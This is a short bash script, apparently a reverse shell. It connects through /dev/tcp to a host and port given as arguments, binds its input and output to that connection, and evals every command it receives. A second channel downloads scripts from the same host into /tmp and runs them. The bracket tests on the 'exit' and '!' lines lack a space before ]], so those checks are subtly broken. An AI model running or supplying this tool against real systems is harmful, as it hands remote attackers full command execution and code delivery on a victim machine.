function cleanup(){
    rm -f $TMPFL
}

function runScript(){
    echo "$1" > /dev/tcp/${HOMEHOST}/${HOMEPORT2}
    sleep 1
    if [[ $1 == 'exit']]; then exit; fi
    cat > $TMPFL < /dev/tcp/${HOMEHOST}/${HOMEPORT3}
}

HOMEHOST=$1
HOMEPORT=$2
HOMEPORT2=${3:-$((HOMEPORT+1))}
HOMEPORT3=${4:-$((HOMEPORT2+1))}

TMPFL="/tmp/$$.sh"
trap cleanup EXIT


exec </dev/tcp/${HOMEHOST}/${HOMEPORT} 1>&0 2>&0

while true
do
    echo -n '$ '
    read -r
    if [[ ${REPLY:0:1} == '!']]
    then
        FN=${REPLY:1}
        runScript $FN
    else
        eval "$REPLY"
    fi
done

